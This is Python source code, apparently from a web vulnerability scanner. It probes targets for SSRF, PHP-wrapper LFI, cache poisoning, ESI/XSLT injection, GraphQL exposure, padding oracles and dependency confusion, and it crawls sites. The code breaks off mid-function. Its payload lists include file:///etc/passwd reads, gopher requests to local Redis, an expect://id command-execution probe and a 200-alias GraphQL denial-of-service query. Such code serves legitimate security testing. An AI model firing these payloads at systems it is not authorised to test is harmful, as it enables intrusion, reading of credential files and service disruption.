def scan_cve_fingerprint(base: str) -> ScanFindings:
    out: ScanFindings = []
    _, h, _, _ = _req(base)
    server = h.get("Server", "") + h.get("X-Powered-By", "")

    sub_checks = [
        lambda: _cve_probe_shellshock(base),
        lambda: _cve_probe_struts(base),
        lambda: _cve_probe_spring4shell(base),
        lambda: _cve_probe_apache_version(base, server),
        lambda: _cve_probe_drupal(base),
        lambda: _cve_probe_wordpress(base),
        lambda: _cve_probe_phpmyadmin(base),
    ]
    with ThreadPoolExecutor(max_workers=7) as ex:
        for f in as_completed([ex.submit(fn) for fn in sub_checks]):
            try:
                out.extend(f.result())
            except Exception:
                pass
    return out

def scan_subdomain_enum(base: str) -> ScanFindings:
    out: ScanFindings = []
    parsed = urllib.parse.urlparse(base)
    host = parsed.hostname or ""
    parts = host.split(".")
    if len(parts) < 2:
        return out
    domain = ".".join(parts[-2:])
    scheme = parsed.scheme

    common_subs = [
        "www", "api", "dev", "staging", "test", "admin", "portal", "app",
        "mail", "remote", "vpn", "static", "cdn", "assets", "blog", "shop",
        "m", "mobile", "secure", "auth", "login", "dashboard", "account",
        "status", "monitor", "jenkins", "ci", "gitlab", "jira", "confluence",
        "grafana", "kibana", "elastic", "beta", "preview", "demo", "old",
        "backup", "db", "mysql", "redis", "ftp", "smtp", "mx", "ns1", "ns2",
        "internal", "intranet", "corp", "office", "hr", "it", "support",
    ]

    found: List[str] = []
    found_lock = threading.Lock()
    stop = threading.Event()

    wildcard_ips: Set[str] = set()
    wildcard_names = [
        "nope-" + hashlib.md5((domain + str(i)).encode()).hexdigest()[:12] + "." + domain
        for i in range(2)
    ]
    for bogus in wildcard_names:
        try:
            wildcard_ips.update(socket.gethostbyname_ex(bogus)[2])
        except (socket.gaierror, socket.timeout, OSError):
            pass

    def _probe(sub: str) -> Optional[str]:
        if stop.is_set():
            return None
        fqdn = sub + "." + domain
        try:
            ips = set(socket.gethostbyname_ex(fqdn)[2])
        except (socket.gaierror, socket.timeout, OSError):
            return None
        if not ips:
            return None
        if wildcard_ips and ips.issubset(wildcard_ips):
            return None
        url = scheme + "://" + fqdn
        c, h, body, _ = _req(url, timeout=3.5)
        if c > 0:
            title = ""
            try:
                tm = re.search(r"<title[^>]*>([^<]{1,80})</title>", body.decode("utf-8", "ignore"), re.I)
                if tm:
                    title = " title=" + re.sub(r"\s+", " ", tm.group(1)).strip()[:55]
            except Exception:
                pass
            return fqdn + " (HTTP " + str(c) + ")" + title
        return fqdn + " (DNS " + ",".join(sorted(ips)[:2]) + ")"

    max_hits = 18
    with ThreadPoolExecutor(max_workers=16) as ex:
        futures = {ex.submit(_probe, s): s for s in common_subs}
        for fut in as_completed(futures):
            try:
                result = fut.result()
            except Exception:
                continue
            if result:
                with found_lock:
                    found.append(result)
                    if len(found) >= max_hits:
                        stop.set()

    skip = {host}
    for r in found:
        fqdn = r.split(" ")[0]
        if fqdn not in skip:
            detail = "dns + http probe"
            if "(DNS " in r:
                detail = "dns resolved; http unavailable or timed out"
            out.append(("subdomain discovered: " + r, detail))
    if wildcard_ips:
        out.append(("wildcard DNS detected during subdomain enum; wildcard-only matches suppressed", ",".join(sorted(wildcard_ips)[:4])))
    return out

_H2C_PROBES_STATIC: List[Dict[str, str]] = [
    {"Upgrade": "h2c", "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA", "Connection": "Upgrade, HTTP2-Settings"},
    {"Upgrade": "h2c", "Connection": "Upgrade"},
]

def scan_h2c_smuggling(base: str) -> ScanFindings:
    out: ScanFindings = []
    parsed = urllib.parse.urlparse(base)
    host = parsed.netloc
    probes: List[Dict[str, str]] = _H2C_PROBES_STATIC + [
        {"Upgrade": "websocket", "Connection": "Upgrade", "Sec-WebSocket-Version": "13",
         "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode()},
    ]
    for hdrs in probes:
        c, h, _, _ = _req(base, headers=hdrs)
        if c == 101:
            label = hdrs.get("Upgrade", "protocol")
            out.append(("h2c/upgrade smuggling surface: 101 Switching Protocols for " + label, "Host: " + host))
            return out
        if h.get("upgrade", "").lower() in ("h2c", "websocket"):
            out.append(("h2c upgrade advertised in response (edge confusion possible)", h.get("upgrade", "")))
    return out

def scan_cache_key_poisoning(base: str) -> ScanFindings:
    out: ScanFindings = []
    canary = "CACHEKEY" + hashlib.md5(os.urandom(8)).hexdigest()[:8]
    vectors = [
        ("X-Forwarded-Host",   "evil.example.com"),
        ("X-Forwarded-Scheme", "http"),
        ("X-Original-URL",     "/admin/" + canary),
        ("X-Rewrite-URL",      "/admin/" + canary),
        ("X-Forwarded-Port",   "1337"),
        ("X-Host",             "evil.example.com"),
        ("X-Forwarded-Server", "evil.example.com"),
        ("X-HTTP-Host-Override","evil.example.com"),
        ("Forwarded",          "host=evil.example.com"),
    ]
    c_base, h_base, b_base, _ = _req(base)
    base_body = b_base.decode("utf-8", "ignore")
    for hdr, val in vectors:
        test_val = canary + "?" + val if "evil" in val else val
        c, h, b, _ = _req(base, headers={hdr: test_val})
        body = b.decode("utf-8", "ignore")
        if canary in body or (test_val in body and test_val not in base_body):
            out.append(("unkeyed header reflected into body: " + hdr + " (cache poisoning)", test_val))
        ck = h.get("x-cache") or h.get("cf-cache-status") or h.get("age")
        if ck and canary in body:
            out.append(("cache poisoning confirmed via " + hdr + " (cache HIT header present)", str(ck)))
    for path_suffix in [";index.html", "%2F..%2Fadmin", "/%2e%2e/admin"]:
        tc = base.rstrip("/") + path_suffix
        c, h, b, _ = _req(tc)
        if c == 200 and len(b) > 100:
            ct = h.get("content-type", "")
            if "html" in ct and h.get("x-cache", "").lower() in ("hit", "miss"):
                out.append(("path normalization diverges from cache key: " + path_suffix, tc))
    return out

def scan_ssrf_gopher_dict(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["url", "uri", "dest", "redirect", "target", "fetch", "path", "callback"]
    schemes = [
        ("gopher://127.0.0.1:6379/_INFO%0D%0A",         "gopher redis"),
        ("gopher://127.0.0.1:11211/_stats%0D%0A",       "gopher memcached"),
        ("dict://127.0.0.1:11211/stat",                  "dict memcached"),
        ("dict://127.0.0.1:6379/info",                   "dict redis"),
        ("file:///etc/passwd",                           "file scheme"),
        ("file:///c:/windows/win.ini",                   "file scheme (windows)"),
        ("ftp://127.0.0.1/",                             "ftp scheme"),
        ("ldap://127.0.0.1/",                            "ldap scheme"),
        ("netdoc:///etc/hostname",                       "netdoc scheme (java)"),
        ("jar:http://127.0.0.1!/",                       "jar scheme"),
        ("http://[::1]:22/",                             "ipv6 loopback"),
        ("http://127.1:80/",                             "short ip"),
        ("http://2130706433/",                           "decimal ip"),
        ("http://0x7f.0x0.0x0.0x1/",                     "hex ip"),
    ]
    sigs = ["redis_version", "memcached", "root:x:", "[extensions]",
            "ssh-2.0", "220 ", "anonymous", "bind"]
    combos = [(p, payload, label) for p in params[:3] for payload, label in schemes]
    found = threading.Event()

    def _probe_ssrf(param: str, payload: str, label: str) -> Optional[Tuple[str, str]]:
        if found.is_set():
            return None
        test = _inject_param(url, param, payload)
        c, _, b, _ = _req(test, timeout=8.0)
        body = b.decode("utf-8", "ignore").lower()
        if c == 200 and any(s in body for s in sigs):
            return ("ssrf " + label + " via param '" + param + "'", payload)
        return None

    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = {ex.submit(_probe_ssrf, p, pay, lbl): (p, pay, lbl) for p, pay, lbl in combos}
        for f in as_completed(futs):
            try:
                r = f.result()
                if r:
                    out.append(r)
                    found.set()
            except Exception:
                pass
    return out

def scan_lfi_php_wrappers(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["file", "page", "include", "template", "path", "lang", "view"]
    wrappers = [
        ("php://filter/convert.base64-encode/resource=index", "b64 php filter"),
        ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "b64 passwd"),
        ("php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "iconv filter"),
        ("expect://id", "expect wrapper RCE"),
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "data wrapper phpinfo"),
        ("zip://test.zip%23shell.php", "zip wrapper"),
        ("phar://test.phar/shell", "phar wrapper"),
        ("compress.zlib://file:/etc/passwd", "zlib wrapper"),
    ]
    b64_passwd_sig = "cm9vdDp4Oj"
    combos = [(p, payload, label) for p in params[:4] for payload, label in wrappers]
    found = threading.Event()

    def _probe_wrapper(param: str, payload: str, label: str) -> Optional[Tuple[str, str]]:
        if found.is_set():
            return None
        test = _inject_param(url, param, payload)
        c, _, b, _ = _req(test)
        body = b.decode("utf-8", "ignore")
        if c == 200:
            if "b64" in label and (b64_passwd_sig in body or re.search(r"^[A-Za-z0-9+/=]{200,}$", body.strip()[:400], re.M)):
                return ("php wrapper LFI: " + label + " param '" + param + "'", payload)
            if "expect" in label and "uid=" in body:
                return ("php expect:// RCE via param '" + param + "'", payload)
            if "phpinfo" in label and "phpinfo()" in body.lower():
                return ("php data:// eval via param '" + param + "'", payload)
            if "phar" in label and ("unserialize" in body.lower() or "phar" in body.lower()):
                return ("phar deserialization surface via param '" + param + "'", payload)
        return None

    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = {ex.submit(_probe_wrapper, p, pay, lbl): (p, pay, lbl) for p, pay, lbl in combos}
        for f in as_completed(futs):
            try:
                r = f.result()
                if r:
                    out.append(r)
                    found.set()
            except Exception:
                pass
    return out

def scan_esi_injection(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["q", "name", "search", "callback", "page"]
    payloads = [
        ('<esi:include src="http://127.0.0.1/"/>',            "esi include"),
        ('<esi:vars>$(HTTP_COOKIE)</esi:vars>',               "esi vars cookie leak"),
        ('<esi:assign name="x" value="\'hi\'"/><esi:vars>$(x)</esi:vars>', "esi assign"),
        ('<!--esi <esi:include src="http://x"/> -->',         "esi comment bypass"),
    ]
    for param in params[:3]:
        for payload, label in payloads:
            test = _inject_param(url, param, payload)
            c, _, b, _ = _req(test)
            body = b.decode("utf-8", "ignore")
            if "<esi:" not in body and payload not in body and c == 200:
                if label == "esi assign" and "'hi'" not in body and "hi" in body:
                    out.append(("ESI injection: " + label + " on param '" + param + "'", payload))
                    break
                if label == "esi vars cookie leak" and any(k in body.lower() for k in ("sessionid=", "phpsessid", "jsessionid")):
                    out.append(("ESI injection: cookie leaked via esi:vars on '" + param + "'", payload))
                    break
    return out

def scan_xslt_injection(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["xml", "data", "input", "style", "template"]
    xslt_payload = """<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="system-property('xsl:version')"/>|<xsl:value-of select="system-property('xsl:vendor')"/>
</xsl:template></xsl:stylesheet>"""
    for param in params[:3]:
        test = _inject_param(url, param, xslt_payload)
        c, _, b, _ = _req(test)
        body = b.decode("utf-8", "ignore")
        vendors = ["saxonica", "libxslt", "xalan", "microsoft", "apache"]
        if any(v in body.lower() for v in vendors) or re.search(r"\b1\.\d\|", body):
            out.append(("XSLT injection: processor fingerprint leaked via '" + param + "'", body[:120]))
    return out

def scan_dependency_confusion(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    body = b.decode("utf-8", "ignore")
    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body)
    js_contents = [body]
    for src in script_srcs[:6]:
        js_url = urllib.parse.urljoin(base, src)
        jc, _, jb, _ = _req(js_url)
        if jc == 200:
            js_contents.append(jb.decode("utf-8", "ignore"))
    all_code = "\n".join(js_contents)
    pkg_patterns = [
        (r'"@([a-z0-9][a-z0-9-]+)/([a-z0-9][a-z0-9-]+)"', "npm scoped package"),
        (r'require\(["\']@([a-z0-9][a-z0-9-]+)/([a-z0-9][a-z0-9-]+)["\']\)', "npm require scoped"),
        (r'from\s+["\']@([a-z0-9][a-z0-9-]+)/([a-z0-9][a-z0-9-]+)["\']', "es6 import scoped"),
    ]
    candidates: Set[str] = set()
    for pat, _ in pkg_patterns:
        for m in re.finditer(pat, all_code):
            scope, pkg = m.group(1), m.group(2)
            if scope in ("babel", "angular", "vue", "nestjs", "types", "nuxt", "sveltejs", "storybook"):
                continue
            candidates.add("@" + scope + "/" + pkg)
    def _check_npm(pkg: str) -> Optional[Tuple[str, str]]:
        npm_url = "https://registry.npmjs.org/" + urllib.parse.quote(pkg, safe="@/")
        try:
            c2, _, b2, _ = _req(npm_url, timeout=6.0)
            body2 = b2.decode("utf-8", "ignore")
            if c2 == 404 or ('"error"' in body2 and "Not found" in body2):
                return ("dependency confusion risk: private scope '" + pkg + "' unclaimed on npm", npm_url)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=5) as ex:
        futs = [ex.submit(_check_npm, pkg) for pkg in list(candidates)[:5]]
        for f in as_completed(futs):
            try:
                r = f.result()
                if r:
                    out.append(r)
            except Exception:
                pass
    return out

def scan_graphql_field_suggest(base: str) -> ScanFindings:
    out: ScanFindings = []
    gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/graphiql"]
    target = None
    for path in gql_paths:
        u = base.rstrip("/") + path
        c, _, b, _ = _req(u, method="POST",
                          data=b'{"query":"{__typename}"}',
                          headers={"Content-Type": "application/json"})
        if c == 200 and b"__typename" in b:
            target = u
            break
    if not target:
        return out
    introspect = b'{"query":"{__schema{types{name}}}"}'
    c, _, b, _ = _req(target, method="POST", data=introspect,
                      headers={"Content-Type": "application/json"})
    if b"__schema" in b and b"types" in b:
        out.append(("graphql introspection fully open on " + target, "__schema leaked"))
        return out
    probes = ["user", "users", "account", "admin", "secret", "key", "token", "password",
             "email", "config", "flag", "debug", "internal"]
    for name in probes:
        q = ('{"query":"{' + name + '{__typename}}"}').encode()
        c, _, b, _ = _req(target, method="POST", data=q,
                          headers={"Content-Type": "application/json"})
        body = b.decode("utf-8", "ignore")
        suggest = re.search(r'Did you mean [\'"]?([a-zA-Z_]+)', body)
        if suggest:
            out.append(("graphql field suggestion leaks schema: " + name + " -> " + suggest.group(1), target))
        elif '"data"' in body and '"' + name + '"' in body and "null" not in body[:200]:
            out.append(("graphql field exists (no auth required): " + name, target))
    alias_bomb = '{"query":"{' + ",".join("a%d:__typename" % i for i in range(200)) + '}"}'
    t0 = time.perf_counter()
    c, _, b, _ = _req(target, method="POST", data=alias_bomb.encode(),
                      headers={"Content-Type": "application/json"}, timeout=15.0)
    elapsed = time.perf_counter() - t0
    if c == 200 and elapsed < 10 and b.count(b"__typename") > 100:
        out.append(("graphql alias overload DoS surface: 200 aliases accepted (%.2fs)" % elapsed, target))
    return out

def scan_padding_oracle(url: str) -> ScanFindings:
    out: ScanFindings = []
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    cookie_jar = _GLOBAL_HEADERS.get("Cookie", "")
    suspects: List[Tuple[str, str, str]] = []
    for k, v in params:
        if len(v) >= 16 and len(v) % 4 == 0 and re.match(r"^[A-Za-z0-9+/=_-]+$", v):
            suspects.append(("query", k, v))
    for ck in cookie_jar.split(";"):
        if "=" in ck:
            ck_name, _, ck_val = ck.strip().partition("=")
            if len(ck_val) >= 16 and len(ck_val) % 4 == 0 and re.match(r"^[A-Za-z0-9+/=_%-]+$", ck_val):
                suspects.append(("cookie", ck_name, ck_val))
    for source, name, val in suspects[:3]:
        try:
            raw = base64.urlsafe_b64decode(val + "=" * (-len(val) % 4))
        except Exception:
            continue
        if len(raw) < 16 or len(raw) % 8 != 0:
            continue
        corrupted = bytearray(raw)
        corrupted[-9] ^= 0xFF
        mangled = base64.urlsafe_b64encode(bytes(corrupted)).decode().rstrip("=")
        if source == "query":
            test = _inject_param(url, name, mangled)
            c1, _, b1, _ = _req(test)
        else:
            new_cookie = cookie_jar.replace(val, mangled)
            c1, _, b1, _ = _req(url, headers={"Cookie": new_cookie})
        c0, _, b0, _ = _req(url)
        body1 = b1.decode("utf-8", "ignore").lower()
        body0 = b0.decode("utf-8", "ignore").lower()
        oracle_sigs = ["padding is invalid", "bad padding", "padding exception",
                       "cryptographicexception", "invalid padding", "mac check failed",
                       "decrypt", "cipher"]
        if c1 != c0 and any(s in body1 for s in oracle_sigs) and not any(s in body0 for s in oracle_sigs):
            out.append(("padding oracle signature on " + source + " '" + name + "' (block cipher CBC)", val[:40]))
        elif c1 == 500 and c0 != 500 and len(raw) % 16 == 0:
            out.append(("possible padding oracle: " + source + " '" + name + "' corruption -> 500", val[:40]))
    return out


def _param_sim_key(code: int, body: bytes, h: Dict[str, str]) -> Tuple[int, int, int]:
    length = len(body) // 32
    cl = 0
    try:
        cl = int(h.get("content-length", "0")) // 32
    except Exception:
        cl = 0
    word_count = body.count(b" ") // 16
    return (code, length, word_count + cl)

def _param_bisect(url: str, params: List[str], canary: str,
                  baseline: Set[Tuple[int, int, int]]) -> List[Tuple[str, str]]:
    if not params:
        return []
    qsep = "&" if "?" in url else "?"
    query = "&".join(p + "=" + canary + "_" + p[:8] for p in params)
    c, h, b, _ = _req(url + qsep + query, timeout=10.0)
    if c == 0:
        return []
    key = _param_sim_key(c, b, h)
    body = b.decode("utf-8", "ignore")
    reflected: List[Tuple[str, str]] = []
    for p in params:
        marker = canary + "_" + p[:8]
        if marker in body:
            reflected.append((p, "reflected in response"))
    if reflected:
        return reflected
    if key in baseline:
        return []
    if len(params) == 1:
        return [(params[0], "deviation: code=%d len=%d" % (c, len(b)))]
    mid = len(params) // 2
    left  = _param_bisect(url, params[:mid], canary, baseline)
    right = _param_bisect(url, params[mid:], canary, baseline)
    return left + right

def _crawl(base: str, max_pages: int = 150, max_depth: int = 6) -> Tuple[Set[str], List[Dict]]:
    parsed_base = urllib.parse.urlparse(base)
    origin      = parsed_base.scheme + "://" + parsed_base.netloc
    visited:    Set[str]                          = set()
    forms_seen: Set[str]                          = set()
    forms:      List[Dict]                        = []
    queue_lock  = threading.Lock()
    visited_lock= threading.Lock()
    forms_lock  = threading.Lock()
    queue: collections.deque = collections.deque([(base, 0)])

    link_pat    = re.compile(r'<a\b[^>]+href=["\']([^"\'#][^"\']{1,200})["\']', re.I)
    src_pat     = re.compile(r'<(?:script|img|link|iframe)\b[^>]+(?:src|href)=["\']([^"\']{1,200})["\']', re.I)
    form_pat    = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.I | re.S)
    input_pat   = re.compile(r'<input\b([^>]*)>', re.I)
    sel_pat     = re.compile(r'<select\b[^>]*name=["\']([^"\']+)["\']', re.I)
    txt_pat     = re.compile(r'<textarea\b[^>]*name=["\']([^"\']+)["\']', re.I)
    attr_pat    = re.compile(r'(\w[\w-]*)\s*=\s*["\']([^"\']*)["\']')
    fetch_pat   = re.compile(r'''(?:fetch|axios\.(?:get|post|put|delete)|XMLHttpRequest)[^"'`]{0,40}["'`]([/][^"'`\s]{1,120})["'`]''', re.I)
    api_pat     = re.compile(r'["\'`](/(?:api|v\d+|graphql|rest|service|endpoint)[^"\'`\s]{0,100})["\'`]', re.I)
    ws_url_pat  = re.compile(r'["\']((wss-|https-)://[^"\'<>\s]{4,120})["\']', re.I)
    loc_pat     = re.compile(r'(?:location\.(?:href|assign|replace))\s*=\s*["\']([^"\']{1,200})["\']', re.I)
    redirect_pat= re.compile(r'(?:window\.location|history\.pushState|history\.replaceState)[^"\']{0,40}["\']([^"\']{1,200})["\']', re.I)
    _js_src_pat = re.compile(r'<script[^>]+src=["\']([^"\']{1,200})["\']', re.I)
    _crawl_ex_holder: list = [None]
    _js_lock = threading.Lock()
    _js_futures: list = []

    def _seed_from_discovery() -> None:
        def _fetch_seed(seed_path: str) -> None:
            _, _, sb, _ = _req(origin + seed_path, timeout=4.0)
            if not sb:
                return
            st = sb.decode("utf-8", "ignore")
            for u in re.findall(r'<loc>(https?://[^<]+)</loc>', st):
                if u.startswith(origin):
                    n = u.split("?")[0].split("#")[0]
                    with visited_lock:
                        if n not in visited:
                            with queue_lock:
                                queue.append((u, 1))
            for u in re.findall(r'(?:Allow|Disallow):\s*(/[^\s]*)', st):
                abs_u = origin + u
                n = abs_u.split("?")[0]
                with visited_lock:
                    if n not in visited:
                        with queue_lock:
                            queue.append((abs_u, 1))
        with ThreadPoolExecutor(max_workers=3) as _sex:
            list(_sex.map(_fetch_seed, ("/sitemap.xml", "/sitemap_index.xml", "/robots.txt")))

    def _parse_page(url_item: str, depth: int, body: str) -> None:
        for m in form_pat.finditer(body):
            fa_raw, fb = m.group(1), m.group(2)
            fa = dict(attr_pat.findall(fa_raw))
            action = fa.get("action", url_item).strip()
            if not action.startswith("http"):
                action = urllib.parse.urljoin(origin + "/", action.lstrip("/"))
            method = fa.get("method", "get").upper()
            fields: Dict[str, str] = {}
            field_types: Dict[str, str] = {}
            field_meta: Dict[str, Dict[str, str]] = {}
            for inp in input_pat.finditer(fb):
                ia = dict(attr_pat.findall(inp.group(1)))
                nm   = ia.get("name", "")
                itype= ia.get("type", "text").lower()
                val  = ia.get("value", "")
                if nm and itype not in ("submit", "button", "reset", "image", "file"):
                    fields[nm] = val if val else ("test@example.com" if "email" in nm.lower() else "test123")
                    field_types[nm] = itype or "text"
                    field_meta[nm] = ia
            for sm in sel_pat.finditer(fb):
                fields[sm.group(1)] = "1"
                field_types[sm.group(1)] = "select"
                field_meta.setdefault(sm.group(1), {"name": sm.group(1), "type": "select"})
            for tm in txt_pat.finditer(fb):
                fields[tm.group(1)] = "test"
                field_types[tm.group(1)] = "textarea"
                field_meta.setdefault(tm.group(1), {"name": tm.group(1), "type": "textarea"})
            if fields:
                key = action + "|" + "|".join(sorted(fields))
                with forms_lock:
                    if key not in forms_seen:
                        forms_seen.add(key)
                        forms.append({"action": action, "method": method,
                                      "fields": fields, "field_types": field_types,
                                      "field_meta": field_meta, "attrs": fa,
                                      "origin_url": url_item})
        if depth >= max_depth:
            return
        candidates: List[str] = []
        for pat in (link_pat, src_pat):
            for lm in pat.finditer(body):
                candidates.append(lm.group(1).strip())
        for pat2 in (fetch_pat, api_pat, loc_pat, redirect_pat, ws_url_pat):
            for pm in pat2.finditer(body):
                candidates.append(pm.group(1).strip())
        for href in candidates:
            if href.startswith("javascript:") or href.startswith("mailto:") or href.startswith("data:"):
                continue
            abs_url = urllib.parse.urljoin(origin + parsed_base.path, href).split("#")[0]
            if _CRAWL_SCOPE and _CRAWL_SCOPE not in abs_url:
                continue
            if not abs_url.startswith(origin):
                continue
            parsed_abs = urllib.parse.urlparse(abs_url)
            if _CRAWL_EXCLUDE and any(excl in parsed_abs.path for excl in _CRAWL_EXCLUDE):
                continue
            norm2 = abs_url.split("?")[0]
            with visited_lock:
                if norm2 not in visited:
                    with queue_lock:
                        queue.appendleft((abs_url, depth + 1))

    def _fetch_and_parse(url_item: str, depth: int) -> None:
        norm = url_item.split("?")[0].split("#")[0]
        if _CRAWL_EXCLUDE and any(excl in norm for excl in _CRAWL_EXCLUDE):
            return
        with visited_lock:
            if norm in visited or len(visited) >= max_pages:
                return
            visited.add(norm)
        code, _, body_b, _ = _req(url_item, timeout=5.0)
        if code == 0 or not body_b:
            return
        body = body_b.decode("utf-8", "ignore")
        _parse_page(url_item, depth, body)
        js_srcs: List[str] = []
        for jm in _js_src_pat.finditer(body):
            js_src = jm.group(1).strip()
            if js_src.startswith("//"):
                js_src = "https:" + js_src
            elif not js_src.startswith("http"):
                js_src = urllib.parse.urljoin(origin + "/", js_src.lstrip("/"))
            if js_src.startswith(origin):
                js_srcs.append(js_src)
        if js_srcs and _crawl_ex_holder[0] is not None:
            def _fetch_js(src: str) -> None:
                _, _, js_b, _ = _req(src, timeout=4.0)
                if js_b:
                    _parse_page(src, depth, js_b.decode("utf-8", "ignore"))
            with _js_lock:
                for _js_src in js_srcs:
                    _js_futures.append(_crawl_ex_holder[0].submit(_fetch_js, _js_src))

    _seed_from_discovery()
    with ThreadPoolExecutor(max_workers=20) as ex:
        _crawl_ex_holder[0] = ex
        pending: Set = set()
        while True:
            with visited_lock:
                done = len(visited) >= max_pages
            with queue_lock:
                empty = len(queue) == 0
            if done or (empty and not pending):
                break
            with queue_lock:
                batch: List[Tuple[str, int]] = []
                while queue and len(batch) < 20 - len(pending):
                    batch.append(queue.popleft())
            for u, d in batch:
                pending.add(ex.submit(_fetch_and_parse, u, d))
            done_futs, pending = _futures_wait(pending, timeout=0.1,
                                               return_when="FIRST_COMPLETED")
            for f in done_futs:
                try:
                    f.result()
                except Exception:
                    pass
        _crawl_ex_holder[0] = None

    return visited, forms

def _js_crawl(base: str, seed_urls: Set[str]) -> Tuple[Set[str], List[str], List[Dict], ScanFindings]:
    discovered: Set[str] = set()
    api_hits: List[str] = []
    forms: List[Dict] = []
    js_findings: ScanFindings = []
    seen_forms: Set[str] = set()
    seen_api: Set[str] = set()
    js_lock = threading.Lock()
    parsed_base = urllib.parse.urlparse(base)
    origin = parsed_base.scheme + "://" + parsed_base.netloc
    to_visit = []
    for candidate in [base] + list(seed_urls):
        if candidate and candidate.startswith(origin) and candidate not in to_visit:
            to_visit.append(candidate)
        if len(to_visit) >= 10:
            break

    def _keep_url(raw: str, current: str) -> Optional[str]:
        if not raw or raw.startswith(("javascript:", "mailto:", "tel:", "data:", "blob:")):
            return None
        full = urllib.parse.urljoin(current, raw).split("#")[0]
        p = urllib.parse.urlparse(full)
        if p.scheme not in ("http", "https") or p.netloc != parsed_base.netloc:
            return None
        if _CRAWL_SCOPE and _CRAWL_SCOPE not in full:
            return None
        for ex in _CRAWL_EXCLUDE:
            if ex and ex in full:
                return None
        return full

    def _looks_static(full: str) -> bool:
        path = urllib.parse.urlparse(full).path.lower()
        return bool(re.search(r'\.(?:css|js|mjs|map|png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|mp4|webm|mp3|wav|pdf|zip)(?:$|[?#])', path))

    def _looks_api(full: str) -> bool:
        p = urllib.parse.urlparse(full)
        path = p.path.lower()
        return bool(p.query or re.search(r'/(?:api|graphql|gql|rpc|jsonrpc|rest|v\d+|ajax|xhr|service|endpoint|auth|oauth|account|user|admin)(?:/|$)', path))

    def _add_route(raw: str, current: str) -> None:
        full = _keep_url(raw, current)
        if full and not _looks_static(full):
            with js_lock:
                discovered.add(full)

    def _add_api(raw: str, current: str, force: bool = False) -> None:
        full = _keep_url(raw, current)
        with js_lock:
            if not full or full in seen_api:
                return
            if not force and (_looks_static(full) or not _looks_api(full)):
                return
            seen_api.add(full)
            api_hits.append(full)
            discovered.add(full.split("?")[0])

    def _add_form(item: Dict, current: str) -> None:
        act = _keep_url(item.get("action", "") or current, current)
        if not act:
            return
        fields: Dict[str, str] = {}
        field_types: Dict[str, str] = {}
        field_meta: Dict[str, Dict[str, str]] = {}
        for f in item.get("fields", []) or []:
            if isinstance(f, str):
                name = f
                typ = "text"
                val = ""
                meta = {"name": name, "type": typ}
            else:
                name = str(f.get("name", "") or "")
                typ = str(f.get("type", "") or "text").lower()
                val = str(f.get("value", "") or "")
                meta = {
                    "name": name,
                    "type": typ,
                    "id": str(f.get("id", "") or ""),
                    "placeholder": str(f.get("placeholder", "") or ""),
                    "autocomplete": str(f.get("autocomplete", "") or ""),
                    "aria-label": str(f.get("ariaLabel", "") or ""),
                    "class": str(f.get("className", "") or ""),
                    "data-testid": str(f.get("dataTestid", "") or ""),
                    "value": val,
                }
            if not name or typ in ("submit", "button", "reset", "image", "file"):
                continue
            field_types[name] = typ or "text"
            field_meta[name] = meta
            if val:
                fields[name] = val
            elif typ == "email" or "email" in name.lower():
                fields[name] = "test@example.com"
            elif typ in ("number", "range"):
                fields[name] = "1"
            elif typ in ("checkbox", "radio"):
                fields[name] = "on"
            else:
                fields[name] = "test123"
        if not fields:
            return
        key = act + "|" + "|".join(sorted(fields))
        with js_lock:
            if key in seen_forms:
                return
            seen_forms.add(key)
            forms.append({
                "action": act,
                "method": str(item.get("method", "get") or "get").upper(),
                "fields": fields,
                "field_types": field_types,
                "field_meta": field_meta,
                "attrs": item.get("attrs", {}) or {},
                "origin_url": current,
            })
            discovered.add(act.split("?")[0])

    init_js = """
    (() => {
      try {
        window.__perf_entries = [];
        if (window.PerformanceObserver) {
          const keep = list => list.getEntries().forEach(e => window.__perf_entries.push(e));
          try { new PerformanceObserver(keep).observe({type: 'resource', buffered: true}); } catch(e) {}
          try { new PerformanceObserver(keep).observe({type: 'navigation', buffered: true}); } catch(e) {}
        }
      } catch(e) {}
      try {
        window.__spa_routes = [];
        const addRoute = url => { if (url) window.__spa_routes.push(String(url)); };
        const oldPush = history.pushState;
        const oldReplace = history.replaceState;
        history.pushState = function(state, title, url) { addRoute(url); return oldPush.apply(this, arguments); };
        history.replaceState = function(state, title, url) { addRoute(url); return oldReplace.apply(this, arguments); };
      } catch(e) {}
      try {
        window.__sw_routes = [];
        if (navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
          navigator.serviceWorker.getRegistrations().then(regs => {
            regs.forEach(reg => {
              if (reg.active && reg.active.scriptURL) window.__sw_routes.push(reg.active.scriptURL);
              if (reg.scope) window.__sw_routes.push(reg.scope);
            });
          }).catch(() => {});
        }
      } catch(e) {}
    })();
    """
    extract_js = """
    () => {
      const urls = new Set();
      const add = v => { if (v) urls.add(String(v)); };
      document.querySelectorAll('a[href],area[href],link[href],script[src],img[src],iframe[src],source[src],video[src],audio[src]').forEach(e => add(e.href || e.src || e.getAttribute('href') || e.getAttribute('src')));
      document.querySelectorAll('[data-url],[data-href],[data-src],[data-endpoint],[data-api],[data-route],[formaction]').forEach(e => ['data-url','data-href','data-src','data-endpoint','data-api','data-route','formaction'].forEach(a => add(e.getAttribute(a))));
      const spaRoutes = new Set(window.__spa_routes || []);
      document.querySelectorAll('[to],[routerlink],[router-link]').forEach(e => {
